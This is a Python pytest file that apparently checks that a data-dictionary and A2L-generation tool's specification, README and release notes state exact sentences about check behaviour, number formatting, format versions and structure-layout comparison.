            if not (says and counts and re.search(r"\d+ infos?$", counts[0].strip())):
                wrong.append(f"{transcript.where}: $ {transcript.command}")
        assert not wrong, "runs shown without byte-order-defaulted or its count:\n" + "\n".join(
            wrong
        )


class TestWhatTheA2lChecksCannotSee:
    """``a2l-keyword`` and ``a2l-unrepresentable`` are judged from the descriptions alone: they
    skip what the a2l keeps out and hold what the closure over references brings in, and since
    neither check reads the image or the map, an object a run drops because its build holds
    none of it is held too."""

    SPEC_TEXT = flattened(SPEC)
    CHECKS_TEXT = flattened(CONSISTENCY_CHECKS)
    RELEASE = flattened(CHANGELOG.split("\n## ", 2)[1])

    @staticmethod
    def a2l(tick: str) -> str:
        return "A2L" if tick == "`" else "a2l"

    @pytest.mark.parametrize(
        ("text", "tick"), [("SPEC_TEXT", "`"), ("CHECKS_TEXT", "``")], ids=["SPEC", "checks"]
    )
    def test_the_keyword_check_skips_what_the_a2l_keeps_out_and_holds_what_the_closure_brings_in(
        self, text: str, tick: str
    ) -> None:
        page = getattr(self, text)
        a2l = self.a2l(tick)
        assert (
            f"judged from the descriptions alone. It skips what the {a2l} keeps out and holds "
            f"what the closure over references brings in: an object or a member that states "
            f"{tick}export: false{tick} for the {a2l} is skipped, unless an exported object "
            f"names it, an axis under an exported curve or a measurement an exported axis names "
            f"as its {tick}input{tick}, and is held then. It reads neither the image nor the "
            f"map, so an object a run drops because its build holds none of it "
            f"({tick}condition-left-out{tick}) still draws the error, and "
            f"{tick}-W a2l-keyword=ignore{tick} relaxes it for that run"
        ) in page
        assert f"for the {a2l} is not held, but the check reads" not in page
        assert "An object or a member the a2l leaves out is not held" not in page
        assert "member, the A2L leaves out is not held" not in page

    @pytest.mark.parametrize(
        ("text", "tick"), [("SPEC_TEXT", "`"), ("CHECKS_TEXT", "``")], ids=["SPEC", "checks"]
    )
    def test_the_limits_check_skips_what_the_a2l_keeps_out_and_holds_what_the_closure_brings_in(
        self, text: str, tick: str
    ) -> None:
        page = getattr(self, text)
        a2l = self.a2l(tick)
        assert f"fires for what the descriptions send to the {a2l}" in page
        assert (
            f"it skips what the {a2l} keeps out and holds what the closure over references "
            f"brings in, so an object kept out of the {a2l} on its own, or a member, is "
            f"skipped unless an exported object names it, an axis under an exported curve or a "
            f"measurement an exported axis names as its {tick}input{tick}"
        ) in page
        assert "is not held. Judged from the descriptions alone" not in page
        assert f"for the {a2l} is not held. Judged" not in page
        assert (
            f"neither the image nor the map, so an object a run drops because its build holds "
            f"none of it ({tick}condition-left-out{tick}) is"
        ) in page
        assert (
            f"the same, and stops a {tick}--strict{tick} run; "
            f"{tick}-W a2l-unrepresentable=ignore{tick} relaxes it for that run"
        ) in page
        assert "The check fires only for an object the A2L carries" not in page
        assert "It fires for what the file carries" not in page

    def test_the_release_note_says_it_of_both_checks(self) -> None:
        assert (
            "it skips what the a2l keeps out and holds what the closure over references brings "
            "in, so an object or a member that states `export: false` for the a2l is skipped "
            "unless an exported object names it, an axis under an exported curve or a "
            "measurement an exported axis names as its `input`; but the check cannot see"
        ) in self.RELEASE
        assert (
            "Like the keyword check, it skips what the a2l keeps out and holds what the closure "
            "over references brings in."
        ) in self.RELEASE
        assert "it holds a name only where the a2l is meant to write it" not in self.RELEASE
        assert "for the a2l is not held; but" not in self.RELEASE
        assert "so a name only such a run drops still draws the error" in self.RELEASE
        assert (
            "It cannot see a run's left-out objects either, so an object only such a run drops "
            "is still named, and `-W a2l-unrepresentable=ignore` relaxes it for that run"
        ) in self.RELEASE
        assert (
            "and so does one whose object only a run drops because its build holds none of it, "
            "since the check reads neither the image nor the map"
        ) in self.RELEASE


class TestTheRuleOfADerivedEnd:
    """The conversions page and SPEC 3.3.1 give one rule: the short decimal within four units
    in the last place, the number itself otherwise, and no end rounded outward."""

    CONVERSIONS = flattened(PAGES["docs/file_formats/conversions.rst"])
    SPEC_TEXT = flattened(SPEC)

    def test_the_conversions_page_states_the_tail_and_the_number_itself(self) -> None:
        for said in (
            "An end within four units in the last place of its twelve digit decimal is written "
            "as that decimal, ``7.65`` here, which may sit up to those four units inward of the "
            "product",
            "``sint16`` under ``factor 0.1`` gives ``3276.7`` where the product is "
            "``3276.7000000000003``",
            "Any other end is the number itself, in the fewest digits that read back as it: "
            "``uint64`` under ``factor 1`` gives ``1.8446744073709552e+19``, and ``uint32`` "
            "under 2^-10 ``4194303.9990234375``",
            "so a ``float32`` stops at ``FLT_MAX``, ``3.4028234663852886e+38``",
        ):
            assert said in self.CONVERSIONS, said
        assert "rounded to twelve significant digits" not in self.CONVERSIONS
        assert "The rounded end is what reaches" not in self.CONVERSIONS

    def test_spec_no_longer_says_an_end_is_rounded_outward(self) -> None:
        assert (
            "where it is rounded it lies within the arithmetic's tail of four units in the last "
            "place of the computed product, on whichever side of it the end falls"
        ) in self.SPEC_TEXT
        assert "it moves inward of the computed product" not in self.SPEC_TEXT
        assert "That may take the end inward of the float" not in self.SPEC_TEXT
        assert (
            "That may take the end to either side of the float, by at most four units in its "
            "last place: `7.65` is outward of the `7.6499999999999995` it replaces, and `sint16` "
            'under `{"factor": 0.1}` states `3276.7`, inward of the product `3276.7000000000003`'
        ) in self.SPEC_TEXT
        assert "is rounded outward where it is rounded at all" not in self.SPEC_TEXT


class TestWhatTheReadmeAndTheConceptPageNoLongerOverstate:
    """The README's store through a ``const`` object, its options of ``ddd_generate()``, the
    retain macro beside two excerpts, and what the concept page says a preview says."""

    README_TEXT = flattened(README)
    ARTEFACTS = flattened(PAGES["docs/generated_artefacts.rst"])
    CONCEPT = flattened(PAGES["docs/concept.rst"])

    def test_the_readme_says_what_a_store_through_a_const_object_did(self) -> None:
        assert (
            "a hosted program built by gcc 15.2.0 that stores 7 into a `const` object of 3 "
            "faults at `-O0`, `-O2` and `-Os`, and with the page made writable first the object "
            "still reads 3 at all three, where a `const volatile` one reads the 7"
        ) in self.README_TEXT
        assert "prints it back out of memory" not in self.README_TEXT

    def test_the_readme_names_every_option_of_ddd_generate(self) -> None:
        module = (ROOT / "cmake" / "Ddd.cmake").read_text(encoding="utf-8")
        call = module[module.index('_ddd_refuse_empty_keywords(\n        "ddd_generate"') :]
        lists = re.findall(r'^\s+"([A-Z0-9_;]+)"', call[: call.index(")")], re.MULTILINE)
        keywords = {word for spelled in lists for word in spelled.split(";")}
        assert "A2L_MODULE_FRAGMENT" in keywords and "PROJECT" in keywords
        options = self.README_TEXT[self.README_TEXT.index("Options: `PROJECT`") :]
        options = options[: options.index("The last one matters")]
        assert {word for word in keywords if f"`{word}`" not in options} == set()

    def test_the_retain_macro_is_said_beside_two_excerpts_that_show_it(self) -> None:
        assert (
            "The `DDD_RETAIN` before each definition is theirs too, a macro the file defines "
            "empty unless the build defines it first, which a build linking with "
            "`--gc-sections` on ELF does"
        ) in self.README_TEXT
        assert (
            "So is the ``DDD_RETAIN`` before each definition, a macro the file defines empty "
            "unless the build defines it first, which a build linking with ``--gc-sections`` on "
            "ELF does"
        ) in self.ARTEFACTS

    def test_the_concept_page_says_the_fix_says_so_and_nothing_of_a_preview(self) -> None:
        assert "the fix a finding carries says so in its title" in self.CONCEPT
        assert "the preview of each says so" not in self.CONCEPT


class TestWhatTheReleaseNoteSaysOfBranchFive:
    """Three claims of the unreleased entries, each held to what a run showed: what a baseline
    0.11.0 archived meets, which cmake step prints ``byte-order-defaulted``, and the fields and
    figures the a2l's entries name."""

    TEXT = flattened(UNRELEASED)

    def test_a_baseline_of_0_11_0_meets_the_member_blocks_as_changed_a2l(self) -> None:
        assert (
            "so `ddd compare` against a baseline 0.11.0 archived reports `changed-a2l` once for "
            "every such leaf"
        ) in self.TEXT
        assert (
            "so `ddd check --baseline --strict` of a project unchanged since passes with 0.11.0 "
            "and exits 1 after the upgrade, its four warnings made errors"
        ) in self.TEXT

    def test_the_info_is_said_of_the_cmake_steps_that_write_an_a2l(self) -> None:
        assert (
            "A cmake build with no `BYTE_ORDER` prints it from the generation of a build of one "
            "step and from the step that writes the a2l after the link with `ADDRESS_MAP`, and "
            "from no step of a build with `ADDRESSES_FROM_IMAGE`, whose a2l takes the image's "
            "byte order"
        ) in self.TEXT
        assert "printed on a pre-link run of a two step cmake flow" not in self.TEXT

    def test_the_uint64_end_is_spelled_as_the_a2l_writes_it(self) -> None:
        from ddd.models import format_number

        written = format_number(float(2**64 - 1))
        assert written == "1.8446744073709552e+19"
        assert f"as `{written}` for the `uint64`" in self.TEXT
        assert "1.8446744073709552e19" not in self.TEXT

    def test_the_method_name_order_puts_every_other_calibration_object_after_the_axes(
        self,
    ) -> None:
        assert (
            "measurements first, then axes, then the other calibration objects, parameters, "
            "value blocks, curves and maps together in the dictionary's order"
        ) in self.TEXT
        assert "then axes, then curves and maps, a member's" not in self.TEXT

    def test_every_field_the_a2l_options_gained_is_named_where_it_stands(self) -> None:
        from ddd.backends.a2l.options import A2lOptions

        names = [field.name for field in dataclasses.fields(A2lOptions)]
        assert names == [
            "byte_order",
            "alignment_cap",
            "version",
            "addresses",
            "links",
            "has_address_source",
            "left_out",
            "module_fragment",
        ]
        assert (
            "gains five fields in this release: `module_fragment`, `links`, which a member's "
            "`SYMBOL_LINK` below is written from, `alignment_cap`, which `MOD_COMMON`'s "
            "alignments below are, `left_out`, named above, and `has_address_source`, which "
            "says whether the run had a source of addresses"
        ) in self.TEXT
        assert "gains three fields in this release" not in self.TEXT
        assert (
            "`A2lOptions` also gains `has_address_source`, for the comment under `ASAP2_VERSION`"
        ) in self.TEXT

    def test_the_positions_the_a2l_options_took_in_0_11_0_bind_otherwise(self) -> None:
        from ddd.backends.a2l.options import A2lOptions, ByteOrder

        shifted = A2lOptions(ByteOrder.BIG, "1 61", {"X": 1}, {"Y": ("X", 4)})  # type: ignore[arg-type]
        assert shifted.alignment_cap == "1 61"
        assert shifted.version == {"X": 1}
        assert shifted.addresses == {"Y": ("X", 4)}
        assert (
            "`alignment_cap` stands second, after `byte_order`, and `links`, `has_address_source`, "
            "`left_out` and `module_fragment` after `addresses`, so code that builds the options "
            'by position meets them there: in `A2lOptions(ByteOrder.BIG, "1 61")` the version '
            "0.11.0 took second is taken for `alignment_cap`, in a third position the addresses "
            "0.11.0 took there are taken for `version`, and in a fourth, which 0.11.0 refused, "
            "they are the `addresses`"
        ) in self.TEXT
        assert "is taken for `alignment_cap`." not in self.TEXT


class TestWhatTheReleaseNoteSaysOfBranchSix:
    """The migrations of how a delivery is judged that the branch's entries owe a reader: a
    nested array whose size is spelled another way, a component read alone whose outputs are
    graded as read and which `ddd check --baseline` now reads under the floor too, and where a
    file holding only a name is refused and as what."""

    TEXT = flattened(UNRELEASED)

    def test_a_nested_array_spelled_another_way_at_its_size_is_said_with_its_migration(
        self,
    ) -> None:
        assert (
            "a nested array of another size or of its size spelled another way, `[2]` as "
            '`["N"]` where `N` is 2'
        ) in self.TEXT
        assert (
            "A nested array whose size a constant names where a number did, or the other way, is "
            "accepted the same way, or keeps the spelling of the baseline."
        ) in self.TEXT

    def test_an_output_of_a_component_read_alone_is_said_to_be_graded_as_read(self) -> None:
        for said in (
            "**An output a component drops or changes is graded as one somebody reads, an input "
            "it stops reading stops nothing, and a component is read the same way by every "
            "command.**",
            "and every grade that waits on a reader takes an output of it as read, with a message "
            "that does not claim to know a reader",
            "Renamed with its id kept, given a condition or another one, or turned `volatile`, it "
            "is now `renamed-read-object`, `narrowed-condition` or `changed-interface`, each an "
            "error, where it was the warning `renamed-object`, `changed-condition` or "
            "`changed-storage`",
            "a measurement's limits widened are now the warning `widened-limits`, where they were "
            "silent, and narrowed the info `narrowed-read-limits`, where they were the warning "
            "`narrowed-limits`",
            "An object it declares `local` keeps the grades of an object nobody reads",
            "and a supplier whose gate passed the rename, the condition, the `volatile` or the "
            "wider range of an output, and stops or warns on it now, relaxes the new id for that "
            "delivery",
        ):
            assert said in self.TEXT, said
        assert "**An output a component drops stops a comparison, an input it stops" not in (
            self.TEXT
        )

    def test_a_members_limits_are_said_to_be_held_back_beside_its_variables_interface(
        self,
    ) -> None:
        for said in (
            "The tolerance and the rule that limits are not told beside a changed interface are "
            "as they were, and this release holds a member's limits back beside a change to its "
            "variable's interface as well: its kind, whether it is local, its type, its shape or "
            "where its members lie, which is told once, at the variable, as a "
            "`changed-interface`.",
            "A delivery that moved a member's limits and changed one of those meets the "
            "`changed-interface` alone, and the limits are told again once it is resolved.",
        ):
            assert said in self.TEXT, said

    def test_check_baseline_reads_a_component_baseline_under_the_floor_too(self) -> None:
        assert (
            "`ddd compare`, `ddd check --baseline` without `--standalone` and the Compare tab now "
            "read such a baseline under the floor"
        ) in self.TEXT
        assert (
            "a project checked against a component file with an input exited 1 on it, and exits 0"
        ) in self.TEXT

    def test_a_file_holding_only_a_name_is_refused_as_what_each_reader_refuses_it_as(
        self,
    ) -> None:
        assert (
            "it is refused as `schema` wherever it is given as a delivery to compare: either side "
            "of `ddd compare`, the baseline of `ddd check --baseline` and the tab's baseline"
        ) in self.TEXT
        assert (
            "as the file `ddd check` itself reads it stays refused as `file-kind`, the refusal it "
            "always met"
        ) in self.TEXT
        assert "on either side of `ddd compare` and `ddd check --baseline`, and in the tab" not in (
            self.TEXT
        )


class TestWhatThePagesSayOfFormat10:
    """A leaf's display identifier is a path in the dumped dictionary, which format 10 lets it be;
    the pages that state the format the tool writes state the one it writes."""

    SPEC_TEXT = flattened(SPEC)
    DICTIONARY = flattened(PAGES["docs/data_dictionary.rst"])

    def test_spec_and_the_dictionary_page_state_the_format_the_tool_writes(self) -> None:
        from ddd.ir import DICTIONARY_FORMAT

        written = str(DICTIONARY_FORMAT)
        assert re.findall(r"Its `format` is `(\d+)`", self.SPEC_TEXT) == [written]
        assert re.findall(r"its own format \(`format`, today `(\d+)`\)", self.SPEC_TEXT) == [
            written
        ]
        assert re.findall(r"currently ``(\d+)``", self.DICTIONARY) == [written]

    def test_a_leafs_display_identifier_is_said_to_be_a_path(self) -> None:
        assert (
            "and its `display_identifier` the member's own, or the path that the members above "
            "it compose ([section 3.7](#37-type-description)), as `V[1].J.b`: identifiers joined "
            "by dots, each with its indices"
        ) in self.SPEC_TEXT
        assert "are the member's own. `types` lists the" not in self.SPEC_TEXT
        assert (
            "Format 10 lets a leaf's ``display_identifier`` be a path of identifiers, "
            "``V[1].J.b``, which a member naming a structure composes for every leaf below it; a "
            "format 9 dictionary holds at most one identifier there, and reads back unchanged"
        ) in self.DICTIONARY

    def test_the_release_note_says_a_baseline_dumped_again_clears_and_what_0_11_0_reads(
        self,
    ) -> None:
        text = flattened(UNRELEASED)
        assert (
            "its four warnings made errors; dumping the baseline again with this version clears"
            in (text)
        )
        assert (
            "The dumped dictionary is format 10, for the display identifier a leaf takes from a "
            "member above it, a path of identifiers where format 9 held one; a format 9 dictionary "
            "reads back unchanged, and 0.11.0, which reads up to format 9, refuses a format 10 one "
            "as the dictionary of a newer DDD"
        ) in text


def format_statements_of(text: str) -> tuple[list[tuple[int, str]], list[int]]:
    """Every number the text states as a document's format, and which of them no rule places.

    A statement is found by what surrounds a number - ``format 3``, ``format `1``` in either
    spelling, ``` `format` is `10` ```, ``stamped `2``` and the numbers of the build record's
    ``format`` row - and not by the sentences the specification uses today, so a statement in
    other words is found too. Each is then placed by a rule naming what it states: a pair of
    the rule's name and the number. What no rule places is returned by the offset of its number,
    for the guard to fail on.
    """
    found: dict[int, int] = {}
    for finder in (
        r"[Ff]ormat `?(\d+)`?\b",
        r"`format`[^.|`]{0,20}`(\d+)`",
        r"\bstamped `?(\d+)`?",
    ):
        for match in re.finditer(finder, text):
            found[match.start(1)] = int(match.group(1))
    for row in re.finditer(r"\| `format` \|([^|]*)\|", text):
        for number in re.finditer(r"`(\d+)`", row.group(1)):
            found[row.start(1) + number.start(1)] = int(number.group(1))
    rules = (
        ("dictionary now", r"Its `format` is `(\d+)`"),
        ("dictionary now", r"\(`format`, today `(\d+)`\)"),
        ("dictionary older", r"(?:of|at) format (\d+) or older"),
        (
            "record collected, then given",
            r"\| `format` \| version of this document format, raised only when its shape changes; "
            r"`(\d+)`, or `(\d+)` for a record with an `origin`, which is the highest this "
            r"version understands",
        ),
        ("record collected", r"as no record of format `(\d+)` has"),
        ("record given", r"given description alone, and that record is stamped `(\d+)`"),
        (
            "record collected",
            r"shape of format `(\d+)` and is stamped `(\d+)`",
        ),
        ("record read", r"reads a record of format `(\d+)` and of format `(\d+)` alike"),
    )
    placed: list[tuple[int, str]] = []
    covered: set[int] = set()
    for name, pattern in rules:
        for match in re.finditer(pattern, text):
            for group in range(1, (match.lastindex or 0) + 1):
                covered.add(match.start(group))
                label = name.split(", then ")[group - 1] if ", then " in name else name
                placed.append((int(match.group(group)), label))
    return placed, sorted(found[offset] for offset in found.keys() - covered)


class TestEveryFormatNumberTheSpecStatesIsTheTools:
    """The specification names the version of each document the tool writes, and a raise of a
    constant that leaves one number behind has a reader written from the specification refuse
    every file the tool writes. Every statement is found in the specification, placed by what
    it states and held to the constant in the code, which no test types a number for; one the
    guard cannot place fails, so whoever writes a new statement places it here."""

    TEXT = flattened(SPEC)

    @staticmethod
    def _tools_formats() -> dict[str, int]:

        from ddd.build_info import BUILD_INFO_FORMAT, BuildInfo, build_info_text
        from ddd.ir import DICTIONARY_FORMAT

        def written(origin: Literal["collected", "given"]) -> int:
            record = build_info_text(BuildInfo(project="/p/project.ddd.json", origin=origin))
            return int(json.loads(record)["format"])

        assert written("given") == BUILD_INFO_FORMAT
        return {
            "dictionary now": DICTIONARY_FORMAT,
            "record given": written("given"),
            "record collected": written("collected"),
        }

    def test_every_statement_of_a_format_is_one_a_rule_places(self) -> None:
        placed, unplaced = format_statements_of(self.TEXT)
        assert not unplaced, (
            f"the specification states the format numbers {unplaced} in words no rule of "
            f"format_statements_of places: say which document each is the format of"
        )
        # Positive control: a scan that finds nothing places nothing and fails nothing.
        assert {label for _, label in placed} >= {
            "dictionary now",
            "dictionary older",
            "record collected",
            "record given",
            "record read",
        }

    def test_the_formats_it_says_the_tool_writes_are_the_formats_it_writes(self) -> None:
        tools = self._tools_formats()
        placed, _ = format_statements_of(self.TEXT)
        for number, label in placed:
            if label in tools:
                assert number == tools[label], (
                    f"the specification states {label} format {number}, and the tool writes "
                    f"{tools[label]}"
                )

    def test_the_formats_it_says_are_older_were_older(self) -> None:
        tools = self._tools_formats()
        placed, _ = format_statements_of(self.TEXT)
        older = [number for number, label in placed if label == "dictionary older"]
        assert older
        assert all(1 <= number < tools["dictionary now"] for number in older)

    def test_the_record_formats_it_says_are_read_are_the_ones_the_tool_reads(self) -> None:
        tools = self._tools_formats()
        placed, _ = format_statements_of(self.TEXT)
        read = sorted(number for number, label in placed if label == "record read")
        assert read == list(range(tools["record collected"], tools["record given"] + 1))

    def test_a_statement_in_other_words_is_found_and_not_placed(self) -> None:
        for sentence in (
            "The dictionary is at format 11 today.",
            "A record is stamped `3` now.",
            "A reader refuses format `9`.",
        ):
            _, unplaced = format_statements_of(self.TEXT + " " + sentence)
            assert unplaced == [int(re.search(r"\d+", sentence).group())], sentence  # type: ignore[union-attr]
        assert format_statements_of(self.TEXT)[1] == []


class TestWhatARenameOfAnInstanceReportsOfItsDisplayIdentifiers:
    """A rename of a structured variable is each leaf's ``renamed-object`` and no
    ``changed-a2l`` for the instance's name at the head of a composed display identifier."""

    PAGE = flattened(PAGES["docs/comparing_deliveries.rst"])
    SPEC_TEXT = flattened(SPEC)

    def test_the_page_says_the_head_of_a_composed_identifier_is_not_a_second_finding(
        self,
    ) -> None:
        assert (
            "A structured variable renamed with its ``id`` kept is each leaf's ``renamed-object``, "
            "or ``renamed-read-object`` where a component reads the variable, and nothing more "
            "for the display identifiers a member composes, ``V.J.b`` becoming ``W.J.b``, "
            "since the instance's name at their head is the rename told again; an "
            "identifier that changed in any other way, or one a leaf's own member states, is "
            "still ``changed-a2l``"
        ) in self.PAGE

    def test_the_spec_says_it_of_changed_a2l(self) -> None:
        assert (
            "The instance's name at the head of a composed `display_identifier` is not a change "
            "of it, a rename of the variable being the leaf's `renamed-object` or "
            "`renamed-read-object`; one a leaf's own member states has no such head"
        ) in self.SPEC_TEXT


class TestWhatThePagesSayOfAnInitAndWhatItStores:
    """A scalar is the array it fills only when every element holds it, ``-0.0`` is not ``0.0``,
    and a literal no double has the bits for is refused where it is written."""

    SPEC_TEXT = flattened(SPEC)
    PAGE = flattened(PAGES["docs/comparing_deliveries.rst"])
    FORMATS = flattened(PAGES["docs/file_formats/index.rst"])

    def test_the_spec_says_when_a_scalar_is_the_array_and_which_zero_is_which(self) -> None:
        for sentence in (
            "A scalar is the array it fills only when every element of the array holds it: two "
            "tables that differ in any element, such as a square map and its transpose, are two "
            "initial values, and the finding names the first index where they part, the "
            "elements taken in the order C lays them out.",
            "A floating point `-0.0` is not `0.0`, since the sign bit is a stored byte, so an "
            "initial value changing from one to the other is a change; in an integer datatype "
            "`-0` is `0`.",
        ):
            assert sentence in self.SPEC_TEXT, sentence

    def test_the_spec_says_where_a_literal_that_rounds_to_zero_is_refused(self) -> None:
        for sentence in (
            "A literal that no `float64` holds either, such as `1e-400`, is refused where it is "
            "written (`json-syntax`) as `NaN` is, because the reader would otherwise take it for "
            "the zero it rounds to before this rule saw it; a zero in any spelling is kept.",
            "and a number whose digits are not zero but which the parser reads as zero, such as "
            "`1e-400`, is refused by name (`json-syntax`).",
        ):
            assert sentence in self.SPEC_TEXT, sentence

    def test_the_comparison_page_says_the_same_of_the_init(self) -> None:
        assert (
            "A scalar is the array it fills only when every element of the array holds it, so two "
            "tables that differ in any element - a square map and its transpose - are two "
            "initial values, and the finding names the first index they part at, in the order c "
            "lays the elements out. ``-0.0`` is not ``0.0``, since the sign bit is a stored "
            "byte, and changing one into the other is a change of the initial value; in an "
            "integer datatype ``-0`` is ``0``."
        ) in self.PAGE

    def test_the_file_format_page_says_such_a_number_is_refused(self) -> None:
        assert (
            "A number no double has the bits for, such as ``1e-400``, is refused where it is "
            "written, naming it, for a related reason: python would read it as zero before the "
            "rule that a non-zero initial value which its storage rounds to zero is "
            "``init-invalid`` could see it."
        ) in self.FORMATS


class TestWhatThePagesSayOfTheLayoutOfAStructuredVariable:
    """A structured variable's layout is interface, read from the dictionary's ``types`` and said
    once at the variable; a member added after every member of the structure of a single
    variable is the one change that keeps every member where a reader of the baseline looks."""

    SPEC_TEXT = flattened(SPEC)
    PAGE = flattened(PAGES["docs/comparing_deliveries.rst"])
    TYPES = flattened(PAGES["docs/file_formats/types.rst"])

    def test_the_spec_says_what_the_layout_is_and_where_it_is_said(self) -> None:
        for sentence in (
            "the width of a bitfield, the `type` a structured variable names, the layout of a "
            "structured variable or the value of a constant changed.",
            "A bitfield's width and the layout of a structured variable are what a released "
            "structure fixed for its consumers ([section 3.7](#37-type-description)), and a "
            "consumer may be a binary compiled against the baseline's headers: narrowing a field "
            "changes the value every reader takes out of the word, and widening one moves every "
            "member after it.",
            "The layout is read from the dictionary's `types` "
            "([section 5.3](#53-data-dictionary)): the members of the variable's structure in "
            "order, each by its name and by what it holds, a nested structure expanded into its "
            "own members whatever it is called, an "
            "external member by its type's name, its header and its `dimensions`, and each "
            "dimension of a "
            "nested or an external member by its spelling and by its value, a constant's being "
            "the value the dictionary's `constants` give it.",
            "A member holding a value answers for its datatype, its width and its `dimensions` at "
            "its leaf, which compares them.",
            "Any other difference of the layout may leave a reader of the baseline reading a "
            "member, or an element, other than the one it was built to read, while each leaf the "
            "two share still compares identical to the byte - a member inserted, removed, renamed "
            "or reordered, a nested structure grown or rearranged, a nested array resized, an "
            "external member retyped, given another header or resized - and is reported once, at "
            "each variable whose layout it changes, naming the variable's structure and where the "
            "two layouts part; "
            "a structure in no variable's layout changes nothing a reader reads.",
            "The one exception is a member added after every member of the structure of a single "
            "variable, which moves nothing a reader of the baseline reads and is the addition of "
            "the leaves it contributes; added to the structure of an array of structures, it "
            "moves every element after the first, and added to a nested structure, it is a "
            "nested structure grown.",
            "A structured variable's `type` is what every consumer's header declares, so renaming "
            "the structure changes the interface even when its members are untouched, while a "
            "structure nested in it is reached through the member that holds it, so renaming "
            "that one with its layout kept changes nothing.",
        ):
            assert sentence in self.SPEC_TEXT, sentence

    def test_the_spec_no_longer_leaves_an_arrival_to_its_leaf_or_a_move_to_the_structure(
        self,
    ) -> None:
        assert "a member that arrived or left is already the addition" not in self.SPEC_TEXT
        assert "A reordering is reported once, at the structure" not in self.SPEC_TEXT

    def test_the_spec_says_a_nested_structure_is_in_the_layout_of_the_variables_holding_it(
        self,
    ) -> None:
        """A structure only ever nested is no variable's type, and is still compared, in the
        layout of every variable that holds it."""
        assert "a structure no variable is" not in self.SPEC_TEXT
        assert "each variable of the type" not in self.SPEC_TEXT

    def test_the_spec_says_the_variable_answers_for_its_layout(self) -> None:
        for sentence in (
            "The variable answers for what no member carries - its `type` and its layout - and "
            "for what every member carries only because the variable states it:",
            "exactly as an object without an `id` is, and as the changed layout of each variable "
            "whose layout holds the type.",
            "a baseline at format 3 or older states no `dimensions`, so shapes compare by value "
            "alone, those of a structure's members included;",
        ):
            assert sentence in self.SPEC_TEXT, sentence

    def test_the_spec_says_where_the_dictionary_carries_the_layout(self) -> None:
        assert (
            "`types` lists the structures in dependency order with their members, which a "
            "delivery comparison reads the layout of a structured variable from, a dimension "
            "spelled by a constant being read at the value `constants` gives it "
            "([section 4.1](#41-comparing-two-deliveries)), an external member by its header as "
            "well;"
        ) in self.SPEC_TEXT

    def test_the_comparison_page_says_what_the_layout_is_and_where_it_is_said(self) -> None:
        for sentence in (
            "The layout of a :doc:`structure <file_formats/types>` is interface as well, because "
            "a reader may be a binary compiled against the previous delivery's headers, which "
            "takes each member out of the offset those headers gave it.",
            "A structured variable's layout is read from the dictionary's ``types``: the members "
            "of its structure in order, a nested structure expanded into its own members "
            "whatever it is called, an external member by its type's name, its header and its "
            "dimensions, and every dimension by its spelling and its value.",
            "A member inserted, removed, renamed or swapped with another leaves such a reader "
            "reading a member other than the one it was built to read, while every member the "
            "two deliveries share still compares identical to the byte - same path, same "
            "datatype, same conversion, same limits - and so may a nested structure that grew or "
            "was rearranged, a nested array that changed size, or an external member of another "
            "type, header or dimension.",
            "Each is reported once, at every variable whose layout it changed, naming the "
            "structure and where the two layouts part; a structure in no variable's layout "
            "changes nothing anybody reads, and is not compared.",
            "One change alone keeps every member where a reader of the previous delivery looks "
            "for it: a member added after every member of the structure of a single variable, "
            "which is the addition of its leaves and no more.",
            "Added to the structure of an array of structures, it moves every element after the "
            "first, and added to a structure nested in another, it is that structure grown, so "
            "neither is an addition alone.",
            "while a structure nested in it is reached through the member that holds it, so "
            "renaming that one with its layout kept changes nothing.",
        ):
            assert sentence in self.PAGE, sentence
        assert "A reordering is reported once, at the structure" not in self.PAGE
        assert "a structure no variable is" not in self.PAGE

    def test_the_promise_of_a_clean_comparison_says_how_far_its_layout_reaches(self) -> None:
        assert (
            "still addresses the same objects, with the same layout, the same scaling and the "
            "same meaning. The layout is the one the dictionary describes: what an external type "
            "holds is its own header's, which no dictionary records."
        ) in self.PAGE

    def test_the_types_page_says_a_comparison_holds_an_external_member(self) -> None:
        assert (
            "it does not appear in ``ddd list`` or in the dictionary's ``leaves``, because there "
            "is no datatype, unit or range to compare; a delivery comparison holds it by its "
            "type's name, its header and its dimensions alone, as part of the layout of each "
            "variable that holds it."
        ) in self.TYPES
        assert "or in a delivery comparison, because" not in self.TYPES

    def test_the_types_page_says_a_comparison_reports_a_reordering(self) -> None:
        assert (
            "and nothing in the description changes value or name, so before the next build "
            "measures the move it shows in the diff of the json and in ``ddd compare`` against "
            "the delivered dictionary, which reports it at each variable whose layout holds the "
            "structure (:doc:`../comparing_deliveries`)."
        ) in self.TYPES
        assert "the diff of the json is the only place the move is visible" not in self.TYPES


class TestAComponentFileReadAloneIsComparedByWhatOneFileCanKnow:
    """A supplier's gate compares one component file with its predecessor, and the readers its
    dictionary records are the component's own, so the run cannot say that nobody read an output
    it lost, and an input it stopped reading harms nobody. ``removed-input`` is the information
    that says so, and a dump of a component carries no mark of how it was read."""

    def test_the_registry_grades_a_dropped_input_as_an_information(self) -> None:
        assert CHECKS["removed-input"].default_severity is Severity.INFO
        assert CHECKS["removed-input"].comparison

    def test_every_page_lists_the_dropped_input(self) -> None:
        for name, text in {
            "README.md": README,
            "docs/consistency_checks.rst": CONSISTENCY_CHECKS,
            "docs/comparing_deliveries.rst": COMPARING_DELIVERIES,
            "SPEC.md": SPEC,
        }.items():
            assert "removed-input" in flattened(text), name

    def test_every_page_says_an_output_of_a_component_read_alone_is_gone_with_its_readers_unknown(
        self,
    ) -> None:
        for name, text in {
            "README.md": README,
            "docs/consistency_checks.rst": CONSISTENCY_CHECKS,
            "docs/comparing_deliveries.rst": COMPARING_DELIVERIES,
            "SPEC.md": SPEC,
        }.items():
            assert "an output of a component read alone" in flattened(text), name
            assert "whose readers the run was not shown" in flattened(text), name

    def test_the_specification_and_the_comparison_page_say_what_a_dump_costs(self) -> None:
        for name, text in {
            "SPEC.md": SPEC,
            "docs/comparing_deliveries.rst": COMPARING_DELIVERIES,
        }.items():
            flat = flattened(text)
            assert "carries no mark of how it was read" in flat, name
            assert "the mark is a change of the format" in flat, name

    def test_the_specification_and_the_comparison_page_keep_a_local_object_its_grade(self) -> None:
        for name, text in {
            "SPEC.md": SPEC,
            "docs/comparing_deliveries.rst": COMPARING_DELIVERIES,
        }.items():
            flat = flattened(text)
            assert "keeps its grade" in flat, name
            assert "because no other component can read it" in flat, name

    def test_the_comparison_page_says_which_callers_know_a_component_file(self) -> None:
        flat = flattened(COMPARING_DELIVERIES)
        assert (
            "``ddd check --standalone --baseline``, ``ddd compare`` and the Compare tab of "
            "``ddd gui`` take it from the file"
        ) in flat
        assert "An input the component stopped reading is ``removed-input``" in flat

